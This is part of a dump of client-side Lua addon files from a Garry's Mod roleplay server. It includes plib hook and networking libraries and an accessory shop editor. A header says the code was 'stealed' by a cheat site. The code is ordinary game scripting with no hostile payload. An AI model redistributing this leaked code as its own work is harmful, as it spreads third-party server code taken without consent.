--Stealed clientside server code by exechack.cc
--Hostname: ⋙ GAMBITRP ╽ ПОДАРКИ ╽ FREE VIP ⋘ - Part 4/10 - 06/04/2025


--PATH addons/plib_v5/lua/plib/libraries/hook.lua:
local debug_info 	= debug.getinfo
local isstring 		= isstring
local isfunction 	= isfunction
local IsValid 		= IsValid

local hook_callbacks = {}
local hook_index 	 = {}
local hook_id		 = {}

local function GetTable() -- This function is now slow
	local ret = {}
	for name, callbacks in pairs(hook_callbacks) do
		ret[name] = {}
		for index, callback in pairs(callbacks) do
			ret[name][hook_id[name][index]] = callback
		end
	end
	return ret
end

local function Exists(name, id)
	return (hook_index[name] ~= nil) and (hook_index[name][id] ~= nil)
end

local function Call(name, gm, ...)
	local callbacks = hook_callbacks[name]

	if (callbacks ~= nil) then

		local i = 0

		::runhook::
		i = i + 1
		local v = callbacks[i]
		if (v ~= nil) then
			local a, b, c, d, e, f = v(...)
			if (a ~= nil) then
				return a, b, c, d, e, f
			end
			goto runhook
		end
	end

	if (not gm) then
		return
	end

	local callback = gm[name]
	if (not callback) then
		return
	end

	return callback(gm, ...)
end

local function Run(name, ...)
	return Call(name, GAMEMODE, ...)
end

local function Remove(name, id)
	local callbacks = hook_callbacks[name]

	if (not callbacks) then
		return
	end

	local indexes = hook_index[name]
	local index = indexes[id]

	if (not index) then
		return
	end

	local count = #callbacks
	if (count == index) then
		callbacks[index] = nil
		indexes[id] = nil
		hook_id[name][index] = nil
	else
		local ids = hook_id[name]

		callbacks[index] = callbacks[count]
		callbacks[count] = nil

		local lastid = ids[count]

		indexes[id] = nil
		indexes[lastid] = index

		ids[index] = lastid
		ids[count] = nil
	end
end

local function Add(name, id, callback)
	if isfunction(id) then
		callback = id
		id = debug_info(callback).short_src
	end

	if (not callback) then
		return
	end

	if (hook_callbacks[name] == nil) then
		hook_callbacks[name] = {}
		hook_index[name] 	 = {}
		hook_id[name] 	 = {}
	end

	if Exists(name, id) then
		Remove(name, id) -- properly simulate hook overwrite behavior
	end

	local callbacks = hook_callbacks[name]
	local indexes = hook_index[name]

	if (not isstring(id)) then
		local orig = callback
		callback = function(...)
			if IsValid(id) then
				return orig(id, ...)
			end

			local index = indexes[id]
			Remove(name, id)

			local nextcallback = callbacks[index]
			if (nextcallback ~= nil) then
				return nextcallback(...)
			end
		end
	end

	local index = #callbacks + 1
	callbacks[index] = callback
	indexes[id] = index
	hook_id[name][index] = id
end


hook = setmetatable({
	Remove = Remove,
	GetTable = GetTable,
	Exists = Exists,
	Add = Add,
	Call = Call,
	Run = Run
}, {
	__call = function(self, ...)
		return self.Add(...)
	end
})
--PATH addons/plib_v5/lua/plib/libraries/usermessage.lua:
if (SERVER) then
	local message 	= {}
	local pooled 	= {}

	util.AddNetworkString 'umsg.SendLua'
	util.AddNetworkString 'umsg.UnPooled'

	function SendUserMessage(name, recipients, ...)
		umsg.Start(name, recipients)
		for k, v in pairs({...}) do
			local t = type(v)
			if (t == 'string') then
				umsg.String(v)
			elseif IsEntity(v) then
				umsg.Entity(v)
			elseif (t == 'number') then
				umsg.Long(v)
			elseif (t == 'Vector') then
				umsg.Vector(v)
			elseif (t == 'Angle') then
				umsg.Angle(v)
			elseif (t == 'boolean') then
				umsg.Bool(v)
			else
				ErrorNoHalt('SendUserMessage: Couldn\'t send type ' .. t .. '\n')
			end
		end
		umsg.End()
	end

	function BroadcastLua(lua)
		net.Start 'umsg.SendLua'
			net.WriteString(lua)
		net.Broadcast()
	end

	debug.getregistry().Player.SendLua = function(self, lua)
		net.Start 'umsg.SendLua'
			net.WriteString(lua)
		net.Send(self)
	end	

	function umsg.PoolString(name)
		if (not pooled[name]) then
			util.AddNetworkString('umsg.' .. name)
			pooled[name] = true
		end
	end

	function umsg.Start(name, recipients)
		local t = type(recipients)

		if (t == 'CRecipientFilter') then
			message = recipients:GetPlayers()
		elseif (t == 'Player') or (t == 'table') then
			message = recipients
		else
			message = player.GetAll()
		end

		if pooled[name] then
			net.Start('umsg.' .. name)
		else
			umsg.PoolString(name)
			net.Start 'umsg.UnPooled'
			net.WriteString(name)
		end
	end

	function umsg.End()
		net.Send(message)
	end

	function umsg.Angle(value)
		net.WriteAngle(value)
	end

	function umsg.Bool(value)
		net.WriteBool(value)
	end

	function umsg.Char(value)
		net.WriteInt((isstring(value) and string.char(value) or value), 8)
	end

	function umsg.Entity(value)
		net.WriteEntity(value)
	end

	function umsg.Float(value)
		net.WriteFloat(value)
	end

	function umsg.Long(value)
		net.WriteInt(value, 32)
	end

	function umsg.Short(value)
		net.WriteInt(value, 16)
	end

	function umsg.String(value)
		net.WriteString(value)
	end

	function umsg.Vector(value)
		net.WriteVector(value)
	end

	function umsg.VectorNormal(value)
		net.WriteVector(value)
	end
else
	usermessage = {}
	local hooks = {}

	net.Receive('umsg.SendLua', function()
		RunString(net.ReadString())
	end)

	net.Receive('umsg.UnPooled', function(len, ...)
		usermessage.IncomingMessage(net.ReadString())
	end)

	function usermessage.Hook(name, callback, ...)
		if (SERVER) then
			umsg.PoolString(name)
			return
		end

		hooks[name] = {}
		hooks[name].Function = function()
			callback(usermessage, unpack(hooks[name].PreArgs))
		end
		hooks[name].PreArgs	= {...}

		net.Receive('umsg.' .. name, function(len)
			usermessage.IncomingMessage(name)
		end)
	end

	function usermessage.GetTable()
		return hooks
	end

	function usermessage.IncomingMessage(name)
		if hooks[name] then
			hooks[name].Function()
		else
			Msg('Warning: Unhandled usermessage \'' .. name .. '\'\n')
		end
	end

	function usermessage:ReadAngle()
		return net.ReadAngle()
	end

	function usermessage:ReadBool()
		return net.ReadBool()
	end

	function usermessage:ReadChar()
		return net.ReadInt(8)
	end

	function usermessage:ReadEntity()
		return net.ReadEntity()
	end

	function usermessage:ReadFloat()
		return net.ReadFloat()
	end

	function usermessage:ReadLong()
		return net.ReadInt(32)
	end

	function usermessage:ReadShort()
		return net.ReadInt(16)
	end

	function usermessage:ReadString()
		return net.ReadString()
	end

	function usermessage:ReadVector()
		return net.ReadVector()
	end

	function usermessage:ReadVectorNormal()
		local v = net.ReadVector()
		v:Normalize()
		return v
	end

	function usermessage:Reset()
		ErrorNoHalt('usermessage:Reset() is not supported!')
	end
end

--PATH addons/plib_v5/lua/plib/extensions/table.lua:
function table.Filter(tab, callback)
	local i, e, c = 0, #tab, 1

	if (e == 0) then
		goto abort
	end

	::startfilter::
	i = i + 1
	if callback(tab[i]) then
		tab[c] = tab[i]
		c = c + 1
	end

	if (i < e) then
		goto startfilter
	end

	i = c - 1
	::startprune::
	i = i + 1
	tab[i] = nil

	if (i < e) then
		goto startprune
	end

	::abort::

	return tab
end

function table.FilterCopy(tab, callback)
	local ret = {}

	local i, e, c = 0, #tab, 1

	if (e == 0) then
		goto abort
	end

	::startfilter::
	i = i + 1
	if callback(tab[i]) then
		ret[c] = tab[i]
		c = c + 1
	end

	if (i < e) then
		goto startfilter
	end

	::abort::

	return ret
end

function table.ConcatKeys(tab, concatenator)
	concatenator = concatenator or ''
	local str = ''

	for k, v in pairs(tab) do
		str = (str ~= '' and concatenator or str) .. k
	end

	return str
end
--PATH addons/plib_v5/lua/plib/extensions/net.lua:
setmetatable(net, {
	__call = function(self, name, func)
		return self.Receive(name, func)
	end
})

local hook_Call = hook.Call
local math_abs = math.abs
local math_min = math.min
local IsValid 	= IsValid
local Entity 	= Entity
local Color 	= Color
local WriteUInt = net.WriteUInt
local ReadUInt 	= net.ReadUInt
local Start 	= net.Start
local Send 		= (SERVER) and net.Send or net.SendToServer

local Incoming = net.Incoming
function net.Incoming(bitCount, pl)
	hook_Call('IncomingNetMessage', nil, bitCount, pl)
	return Incoming(bitCount, pl)
end

local ReadUInt = net.ReadUInt
function net.ReadUInt(bitCount)
	if (bitCount > 32) or (bitCount < 1) then
		error('Out of range bitCount! Got ' .. bitCount)
	end
	return ReadUInt(bitCount)
end

local ReadInt = net.ReadInt
function net.ReadInt(bitCount)
	if (bitCount > 32) or (bitCount < 1) then
		error('Out of range bitCount! Got ' .. bitCount)
	end
	return ReadInt(bitCount)
end

function net.WriteEntity(ent)
	if IsValid(ent) then
		WriteUInt(ent:EntIndex(), 13)
	else
		WriteUInt(0, 13)
	end
end

function net.ReadEntity()
	local i = ReadUInt(13)
	if (not i) then return end
	return Entity(i)
end

function net.WriteRGB(r, g, b)
	WriteUInt(r, 8)
	WriteUInt(g, 8)
	WriteUInt(b, 8)
end

function net.WriteRGBA(r, g, b, a)
	WriteUInt(r, 8)
	WriteUInt(g, 8)
	WriteUInt(b, 8)
	WriteUInt(a, 8)
end
local WriteRGBA = net.WriteRGBA

function net.WriteColor(c)
	WriteRGBA(c.r, c.g, c.b, c.a)
end

function net.ReadRGB()
	return ReadUInt(8), ReadUInt(8), ReadUInt(8)
end

function net.ReadRGBA()
	return ReadUInt(8), ReadUInt(8), ReadUInt(8), ReadUInt(8)
end
local ReadRGBA = net.ReadRGBA

function net.ReadColor()
	return Color(ReadRGBA())
end

function net.WriteNibble(i)
	WriteUInt(i, 4)
end

function net.ReadNibble()
	return ReadUInt(4)
end

function net.WriteByte(i)
	WriteUInt(i, 8)
end

function net.ReadByte()
	return ReadUInt(8)
end

function net.WriteShort(i)
	WriteUInt(i, 16)
end

function net.ReadShort()
	return ReadUInt(16)
end

function net.WriteLong(i)
	WriteUInt(i, 32)
end

function net.ReadLong()
	return ReadUInt(32)
end

function net.WritePlayer(pl)
	if IsValid(pl) then
		WriteUInt(pl:EntIndex(), 8)
	else
		WriteUInt(0, 8)
	end
end

function net.ReadPlayer()
	local i = ReadUInt(8)
	if (not i) then return end
	return Entity(i)
end

function net.Ping(msg, recipients)
	Start(msg)
	Send(recipients)
end

--PATH addons/plib_v5/lua/plib/extensions/util.lua:
--[[---------------------------------------------------------
   Name: Tracer(vecStart, vecEnd, pEntity, iAttachment, flVelocity, bWhiz, pCustomTracerName, iParticleID)
   Desc: Create a tracer effect
-----------------------------------------------------------]]
-- Tracer flags
TRACER_FLAG_WHIZ = 0x0001
TRACER_FLAG_USEATTACHMENT = 0x0002

TRACER_DONT_USE_ATTACHMENT = -1

function util.Tracer(vecStart, vecEnd, pEntity, iAttachment, flVelocity, bWhiz, pCustomTracerName, iParticleID)
	local data = EffectData()
	data:SetStart(vecStart)
	data:SetOrigin(vecEnd)
	data:SetEntity(pEntity)
	data:SetScale(flVelocity)

	if (iParticleID ~= nil) then
		data:SetHitBox(iParticleID)
	end

	local fFlags = data:GetFlags()

	-- Flags
	if bWhiz then
		fFlags = bit.bor(fFlags, TRACER_FLAG_WHIZ)
	end

	if (iAttachment ~= TRACER_DONT_USE_ATTACHMENT) then
		fFlags = bit.bor(fFlags, TRACER_FLAG_USEATTACHMENT)
		data:SetAttachment(iAttachment)
	end

	data:SetFlags(fFlags)

	-- Fire it off
	if pCustomTracerName then
		util.Effect(pCustomTracerName, data)
	else
		util.Effect("Tracer", data)
	end
end


function util.FindHullIntersection(tbl, tr)
	local iDist = 1e12
	tbl.output = nil
	local vSrc = tbl.start
	local vHullEnd = vSrc + (tr.HitPos - vSrc) * 2
	tbl.endpos = vHullEnd
	local tBounds = { tbl.mins, tbl.maxs }
	local trTemp = util.TraceLine(tbl)

	if (trTemp.Fraction ~= 1) then
		table.CopyFromTo(trTemp, tr)
		return tr
	end

	local trOutput

	for i = 1, 2 do
		for j = 1, 2 do
			for k = 1, 2 do
				tbl.endpos = Vector( vHullEnd.x + tBounds[i].x,
					vHullEnd.y + tBounds[j].y,
					vHullEnd.z + tBounds[k].z )

				local trTemp = util.TraceLine(tbl)

				if (trTemp.Fraction ~= 1) then
					local iHitDistSqr = (trTemp.HitPos - vSrc):LengthSqr()

					if (iHitDistSqr < iDist) then
						trOutput = trTemp
						iDist = iHitDistSqr
					end
				end
			end
		end
	end

	if (trOutput) then
		table.CopyFromTo(trOutput, tr)
	end

	return tr
end

--[[---------------------------------------------------------
	Find an empty Vector
-----------------------------------------------------------]]
local Vector 				= Vector
local ents_FindInSphere 	= ents.FindInSphere
local util_PointContents 	= util.PointContents

local badpoints = {
	[CONTENTS_SOLID] 		= true,
	[CONTENTS_MOVEABLE] 	= true,
	[CONTENTS_LADDER]		= true,
	[CONTENTS_PLAYERCLIP] 	= true,
	[CONTENTS_MONSTERCLIP] 	= true,
}

local function isempty(pos, area)
	if badpoints[util_PointContents(pos)] then
		return false
	end
	local entities = ents_FindInSphere(pos, area)
	for i = 1, #entities do
		if (entities[i]:GetClass() == 'prop_physics') or (entities[i]:IsPlayer() and entities[i]:Alive()) then
			return false
		end
	end
	return true
end

function util.FindEmptyPos(pos, area, steps)
	pos = Vector(pos.x, pos.y, pos.z)
	area = area or 35

	if isempty(pos, area) then
		return pos
	end

	for i = 1, (steps or 6) do
		local step = (i * 50)
		if isempty(Vector(pos.x + step, pos.y, pos.z), area) then
			pos.x = pos.x + step
			return pos
		elseif isempty(Vector(pos.x, pos.y + step, pos.z), area) then
			pos.y = pos.y + step
			return pos
		elseif isempty(Vector(pos.x, pos.y, pos.z + step), area) then
			pos.z = pos.z + step
			return pos
		end
	end

	return pos
end

local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function util.Base64Decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if (x == '=') then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
		return r;
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if (#x ~= 8) then return '' end
		local c=0
		for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

function resource.AddDir(dir, recursive)
	local files, folders = file.Find(dir .. '*', 'GAME')

	for k, v in ipairs(files) do
		resource.AddFile(dir .. v)
	end
	if (recursive == true) then
		for k, v in ipairs(folders) do
			resource.AddDir(dir .. v, recursive)
		end
	end
end

function IsValid(object)
	if (not object) then return false end

	local isvalid = object.IsValid
	if (not isvalid) then return false end

	return isvalid(object)
end

function LerpColor( fraction, from, to )
	return Color( Lerp( fraction, from.r, to.r ), Lerp( fraction, from.g, to.g ), Lerp( fraction, from.b, to.b ), Lerp( fraction, from.a, to.a ) )
end

--PATH addons/plib_v5/lua/plib/extensions/client/draw.lua:
local surface_SetDrawColor 	= surface.SetDrawColor
local surface_SetMaterial 	= surface.SetMaterial
local surface_DrawRect 		= surface.DrawRect
local surface_DrawTexturedRect = surface.DrawTexturedRect
local render_UpdateScreenEffectTexture = render.UpdateScreenEffectTexture
local render_SetScissorRect = render.SetScissorRect
local ScrW = ScrW
local ScrH = ScrH
local SysTime = SysTime
local FrameTime = FrameTime
local Vector = Vector
local Matrix = Matrix

local function DrawRect(x, y, w, h, t)
	if not t then t = 1 end
	surface_DrawRect(x, y, w, t)
	surface_DrawRect(x, y + (h - t), w, t)
	surface_DrawRect(x, y, t, h)
	surface_DrawRect(x + (w - t), y, t, h)
end

function draw.Box(x, y, w, h, col)
	surface_SetDrawColor(col)
	surface_DrawRect(x, y, w, h)
end

function draw.Outline(x, y, w, h, col, thickness)
	surface_SetDrawColor(col)
	DrawRect(x, y, w, h, thickness)
end

function draw.OutlinedBox(x, y, w, h, col, bordercol, thickness)
	surface_SetDrawColor(col)
	surface_DrawRect(x + 1, y + 1, w - 2, h - 2)

	surface_SetDrawColor(bordercol)
	DrawRect(x, y, w, h, thickness)
end

local blurboxes = {}
local blur = Material 'pp/blurscreen'
function draw.BlurResample(amount)
	surface_SetDrawColor(255, 255, 255)
	surface_SetMaterial(blur)
	for i = 1, 3 do
		blur:SetFloat('$blur', (i / 3) * (amount or 8))
		blur:Recompute()
		render_UpdateScreenEffectTexture()

		for k, v in ipairs(blurboxes) do
			render_SetScissorRect(v.x, v.y, v.x + v.w, v.y + v.h, true)
				surface_DrawTexturedRect(0, 0, ScrW(), ScrH())
			render_SetScissorRect(0, 0, 0, 0, false)
			blurboxes[k] = nil
		end

	end
end

function draw.BlurBox(x, y, w, h)
	blurboxes[#blurboxes + 1] = {
		x = x,
		y = y,
		w = w,
		h = h
	}
end

function draw.BlurPanel(panel)
	draw.BlurBox(panel:GetBounds())
end
draw.Blur = draw.BlurPanel -- Backward support

function draw.TextRotated(text, x, y, color, font, ang)
	--render.PushFilterMag(TEXFILTER.ANISOTROPIC)
	--render.PushFilterMin(TEXFILTER.ANISOTROPIC)
	surface.SetFont(font)
	surface.SetTextColor(color)
	local textWidth, textHeight = surface.GetTextSize(text)
	local rad = -math.rad(ang)
	local halvedPi = math.pi / 2
	local m = Matrix()
	m:SetAngles(Angle(0, ang, 0))
	m:SetTranslation(Vector(x, y, 0))
	cam.PushModelMatrix(m)
		surface.SetTextPos(0, 0)
		surface.DrawText(text)
	cam.PopModelMatrix()
	--render.PopFilterMag()
	--render.PopFilterMin()
end
--PATH addons/accessory/lua/accessory/cl_notify.lua:
function SH_ACC:Notify(acc, text, duration)
	if (IsValid(_SH_ACC_NOTIFY)) then
		_SH_ACC_NOTIFY:Remove()
	end

	local scale = math.Clamp(ScrH() / 1080, 0.7, 1)
	local wi, he = 400 * scale, 64 * scale

	local th = 48 * scale
	local m = th * 0.25
	local m5 = m * 0.5
	he = he + m5 * 2

	local pnl = vgui.Create("DButton")
	pnl:SetText("")
	pnl:MoveToFront()
	pnl:SetSize(wi, he)
	pnl:SetPos(ScrW(), ScrH() * 0.7)
	pnl:MoveTo(ScrW() - wi, pnl.y, 0.2, 0, 0.99)
	pnl:DockPadding(m5, m5, m5, m5)
	pnl.DoClick = function(me)
		me.DoClick = function() end
		me:Stop()
		me:AlphaTo(0, 0.2, 0, function()
			me:Remove()
		end)
	end
	pnl.Paint = function(me, w, h)
		draw.RoundedBoxEx(4, 0, 0, w, h, self.Style.header, true, false, true, false)
	end
	_SH_ACC_NOTIFY = pnl

	pnl:AlphaTo(0, 0.2, duration > 0 and duration or 5, function()
		pnl:Remove()
	end)

		if (acc) then
			local bg = vgui.Create("DPanel", pnl)
			bg:Dock(LEFT)
			bg:DockMargin(0, 0, m5, 0)
			bg.Paint = function(me, w, h)
				draw.RoundedBox(4, 0, 0, w, h, self.Style.inbg)
			end

				local mdl = self:CreateAccIcon(acc, bg)
				mdl:SetMouseInputEnabled(false)
		end

		local lbl = self:Label(text, "SH_ACC.Large", self.Style.text, pnl)
		lbl:SetContentAlignment(7)
		lbl:SetWrap(true)
		lbl:Dock(FILL)

		if (duration > 0) then
			local start = CurTime()
			local endtime = start + duration

			local timebar = vgui.Create("DPanel", pnl)
			timebar:SetTall(m5)
			timebar:Dock(BOTTOM)
			timebar:DockMargin(0, m5, 0, 0)
			timebar.Paint = function(me, w, h)
				local tl = (endtime - CurTime()) / (endtime - start)

				draw.RoundedBox(4, 0, 0, w, h, self.Style.bg)
				draw.RoundedBox(4, 0, 0, w * tl, h, self.Style.menu)
			end
		end
end

net.Receive("SH_ACC_NOTIFY", function()
	SH_ACC:Notify(SH_ACC:GetAccessory(net.ReadString()), net.ReadString(), net.ReadUInt(16))
end)
--PATH addons/accessory/lua/accessory/cl_editor.lua:
local function VectorOffset(pos, offset, ang)
	local newpos = Vector()
	newpos:Set(pos + ang:Forward() * offset.x + ang:Right() * offset.y + ang:Up() * offset.z)

	return newpos
end

local function AngleOffset(ang, offset)
	local newang = Angle()
	newang:Set(ang)
	newang:RotateAroundAxis(newang:Up(), offset.y)
	newang:RotateAroundAxis(newang:Right(), offset.p)
	newang:RotateAroundAxis(newang:Forward(), offset.r)

	return newang
end

function SH_ACC:ShowEditor()
	if (!LocalPlayer():IsAdmin()) then
		return end

	if (IsValid(_SH_ACC_EDITOR)) then
		if (IsValid(_SH_ACC_EDITOR.m_PreviewModel)) then
			_SH_ACC_EDITOR.m_PreviewModel:Remove()
		end

		_SH_ACC_EDITOR:Remove()
	end

	local ang = Angle(0, -90, 0)
	local dis = 90
	local mlast_x = ScrW() * 0.5
	local mlast_y = ScrH() * 0.5

	local L, C = self._L, self._C
	local scale = math.Clamp(ScrH() / 1080, 0.7, 1)

	local frame = self:MakeFrame("Accessory Creator")
	frame:MakePopup()
	frame:SetSize(400 * scale, 600 * scale)
	frame:AlignLeft(ScrW() * 0.5 - frame:GetWide() * 1.75)
	frame:CenterVertical()
	frame.m_PreviewModel = NULL
	frame.Think = function(me)
		local mx, my = gui.MousePos()
		local diffx, diffy = (mx - mlast_x), (my - mlast_y)

		if (input.IsMouseDown(MOUSE_RIGHT) and !(diffx > 40 or diffy > 40)) then // right mouse press without sudden jumps
			if (input.IsKeyDown(KEY_E)) then
				dis = math.Clamp(dis + diffy, 10, 500)
			else
				ang = ang + Angle(diffy * 0.5, diffx * 0.5, 0)
			end
		end

		mlast_x, mlast_y = mx, my
	end
	frame.OnClose = function(me)
		if (IsValid(me.m_PreviewModel)) then
			me.m_PreviewModel:Remove()
		end

		hook.Remove("PostPlayerDraw", "SH_ACC.Editor")
		hook.Remove("CalcView", "SH_ACC.Editor")
		hook.Remove("ShouldDrawLocalPlayer", "SH_ACC.Editor")
	end
	_SH_ACC_EDITOR = frame

		local th = 48 * scale
		local m = th * 0.25
		local m5 = m * 0.5

		local body = vgui.Create("DScrollPanel", frame)
		self:PaintScroll(body)
		body:DockMargin(m, m, m, m)
		body:GetCanvas():DockPadding(m5, m5, m5, m5)
		body:Dock(FILL)
		body:GetCanvas().Paint = function(me, w, h)
			draw.RoundedBox(4, 0, 0, w, h, C"inbg")
		end

			local lbl = self:Label("ID (must be unique, A-Z 0-9 characters only)", "SH_ACC.LargeB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, 0, 0, m5)

				local id = self:TextEntry(body)
				id:SetText("accessory")
				id:Dock(TOP)

			local lbl = self:Label("Name", "SH_ACC.LargeB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, m5, 0, m5)

				local name = self:TextEntry(body)
				name:SetText("New Accessory")
				name:Dock(TOP)

			local lbl = self:Label("Slots (separate with spaces)", "SH_ACC.LargeB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, m5, 0, 0)

			local lookup = {
				head = "SH_SLOT_HEAD",
				eyes = "SH_SLOT_EYES",
				mouth = "SH_SLOT_MOUTH",
				back = "SH_SLOT_BACK",
				neck = "SH_SLOT_NECK",
			}

			local lbl = self:Label("Valid: head, eyes, mouth, back, neck", "SH_ACC.MediumB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, 0, 0, m5)

				local slots = self:TextEntry(body)
				slots:SetText("head")
				slots:Dock(TOP)

			local lbl = self:Label("Price", "SH_ACC.LargeB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, m5, 0, m5)

				local price = self:TextEntry(body)
				price:SetText(5000)
				price:Dock(TOP)

			local lbl = self:Label("Model", "SH_ACC.LargeB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, m5, 0, m5)

				local mdl = self:TextEntry(body)
				mdl:Dock(TOP)
				mdl.OnChange = function(me)
					if (IsValid(frame.m_PreviewModel)) then
						frame.m_PreviewModel:Remove()
					end

					local val = me:GetValue():Trim()
					if (file.Exists(val, "GAME")) then
						frame.m_PreviewModel = ClientsideModel(val)
						if (IsValid(frame.m_PreviewModel)) then
							frame.m_PreviewModel:SetNoDraw(true)
						end
					end
				end

			local lbl = self:Label("Bone", "SH_ACC.LargeB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, m5, 0, m5)

				local bone = self:TextEntry(body)
				bone:SetText("ValveBiped.Bip01_Head1")
				bone:Dock(TOP)

			local sliders = {}
			local function addComponent(name)
				for _, c in ipairs {"X", "Y", "Z"} do
					local lbl = self:Label(name .. " " .. c, "SH_ACC.LargeB", C"text", body)
					lbl:Dock(TOP)
					lbl:DockMargin(0, m5, 0, m5)

						local slider = self:NumSlider(body)
						slider.Label:SetVisible(true) -- precise sliding
						slider:SetMinMax(-360, 360)
						slider:Dock(TOP)
						slider.OnValueChanged = function(me, val)
							sliders[name .. c] = val
						end
						slider:SetValue(def)
				end
			end

			addComponent("Position")
			addComponent("Angle")

			local lbl = self:Label("Scale", "SH_ACC.LargeB", C"text", body)
			lbl:Dock(TOP)
			lbl:DockMargin(0, m5, 0, m5)

				local slider = self:NumSlider(body)
				slider.Label:SetVisible(true) -- precise sliding
				slider:SetMinMax(0.01, 5)
				slider:Dock(TOP)
				slider.OnValueChanged = function(me, val)
					sliders.Scale = val
				end
				slider:SetValue(1)

			local export = vgui.Create("DButton", frame)
			export:SetText("Export")
			export:SetColor(C"text")
			export:SetFont("SH_ACC.Medium")
			export:Dock(BOTTOM)
			export:DockMargin(m, 0, m, m)
			export.Paint = function(me, w, h)
				draw.RoundedBox(4, 0, 0, w, h, C"inbg")

				if (me.Hovered) then
					surface.SetDrawColor(C"hover")
					surface.DrawRect(0, 0, w, h)
				end

				if (me:IsDown()) then
					surface.SetDrawColor(C"hover")
					surface.DrawRect(0, 0, w, h)
				end
			end
			export.DoClick = function()
				if (gui.IsGameUIVisible() and !gui.IsConsoleVisible()) then
					self:ShowConfirmMenu("Export", "SH Accessories: Enable your console to see the output.", function() end)
				end

				gui.ActivateGameUI()

				--
				local tx = Color(52, 152, 219)
				MsgC(tx, "\n============================================\n")
				MsgC(tx, "======= SH Accessories - Acc Export ========\n")
				MsgC(tx, "============================================\n\n")

				-- prep and validate
				local sl = {}
				for _, v in pairs (string.Explode(" ", slots:GetValue())) do
					if (lookup[v]) then
						table.insert(sl, lookup[v])
					end
				end

				if (id:GetValue():Trim() == "") then
					MsgC(Color(231, 76, 60), "!! ERROR! ID can't be empty.\n")
					return
				end

				if (mdl:GetValue():Trim() == "") then
					MsgC(Color(231, 76, 60), "!! ERROR! Model can't be empty.\n")
					return
				end

				if (bone:GetValue():Trim() == "") then
					MsgC(Color(231, 76, 60), "!! ERROR! Bone can't be empty.\n")
					return
				end

				if (#sl == 0) then
					MsgC(Color(231, 76, 60), "!! ERROR! No valid slots defined.\n")
					return
				end

				-- output the shit
				local tx = Color(241, 196, 15)
				MsgC(tx, "!! Here is the output of the item to be copied into accessory_list.lua (under CUSTOM ACCESSORIES!)\n\n")

				local tx = color_white
				MsgC(tx, string.format([[local a = New("%s", {name = "%s", price = %d, slot = %s, mdl = "%s"})%s]] .. "\n\n",
					SQLStr(id:GetValue(), true),
					SQLStr(name:GetValue(), true),
					math.max(tonumber(price:GetValue()) or 0, 0),
					table.concat(sl, " + "),
					SQLStr(mdl:GetValue(), true),
					(sliders.Scale ~= 1 and "\na.scale = " .. math.Round(sliders.Scale, 2) .. "\n" or "")
				))

				local tx = Color(241, 196, 15)
				MsgC(tx, "!! Now here is the offset output to be copied into accessory_offets.lua (under CUSTOM OFFSETS!)\n\n")

				local tx = color_white
				MsgC(tx, string.format([[Offset("%s", "%s", Vector(%0.3g, %0.3g, %0.3g), Angle(%0.3g, %0.3g, %0.3g))]] .. "\n\n",
					SQLStr(mdl:GetValue(), true),
					SQLStr(bone:GetValue(), true),
					sliders.PositionX, sliders.PositionY, sliders.PositionZ,
					sliders.AngleX, sliders.AngleY, sliders.AngleZ
				))
			end

	--
	hook.Add("PostPlayerDraw", "SH_ACC.Editor", function(ply)
		if (ply ~= LocalPlayer() or !IsValid(frame) or !IsValid(frame.m_PreviewModel)) then
			return end

		local mdl = frame.m_PreviewModel
		local boneid = ply:LookupBone(bone:GetValue())
		if (!boneid) then
			return end

		local bp, ba = ply:GetBonePosition(boneid)
		if (!bp) then
			return end

		-- Apply model specific bone offsets
		local offset2 = self:GetModelOffset(bone:GetValue(), ply)
		if (offset2) then
			if (offset2.pos) then
				bp = VectorOffset(bp, offset2.pos, ba)
			end

			if (offset2.ang) then
				ba = AngleOffset(ba, offset2.ang)
			end
		end

		local newpos = VectorOffset(bp, Vector(sliders.PositionX, sliders.PositionY, sliders.PositionZ), ba)
		local newang = AngleOffset(ba, Angle(sliders.AngleX, sliders.AngleY, sliders.AngleZ))

		mdl:SetModelScale(sliders.Scale)
		mdl:SetRenderOrigin(newpos)
		mdl:SetRenderAngles(newang)
		mdl:DrawModel()
	end)

	hook.Add("CalcView", "SH_ACC.Editor", function(pl, pos, angles, fov)
		local look_pos = pos
		local bone = pl:LookupBone("ValveBiped.Bip01_Head1")
		if (bone) then
			look_pos = pl:GetBonePosition(bone)
		end

		local view = {}
		view.origin = look_pos + ((pl:GetAngles() + ang):Forward() * dis)
		view.angles = (look_pos - view.origin):Angle()
		view.fov = fov

		return view
	end)

	hook.Add("ShouldDrawLocalPlayer", "SH_ACC.Editor", function(ply)
		return true
	end)
end

concommand.Add("sh_accessories_editor", function()
	SH_ACC:ShowEditor()
end)
--PATH addons/accessory/lua/accessory_config.lua:
/****
	GENERAL CONFIGURATION
	General
****/

-- Whether to use the server's database (sv.db) or MySQL. Restart the map after changing database mode.
-- WARNING: You cannot transfer items from one database to another.
-- 0: sv.db (local)
-- 1: MySQL via gmsv_mysqloo (https://facepunch.com/showthread.php?t=1515853)
--	  Configure the DB settings in accessory/sv_database.lua
-- 2: MySQL via gmsv_tmysql4
--	  Configure the DB settings in accessory/sv_database.lua
SH_ACC.DatabaseMode = 0

-- Set to true to allow players to run a command (defined below) to bring up the menu.
-- AKA players can change their accessories at any time given.
SH_ACC.FreeAccess = true

-- Commands to open the accessory menu. Only works when FreeAccess is true.
-- ! is automatically replaced to / so you don't have to include them.
SH_ACC.FreeAccessCommand = {
	"/accessory",
	"/accessories",
	"/acc",
}

-- Which usergroups are allowed to use the system.
-- Leave the table empty to allow everyone to use the add-on.
SH_ACC.AllowedUsergroups = {
	// Remove the -- below to allow only "vip" players to use the add-on.
	-- ["vip"] = true,
}

-- Fraction of an accessory's price.
-- Anything below 0 will result in unintended behavior!
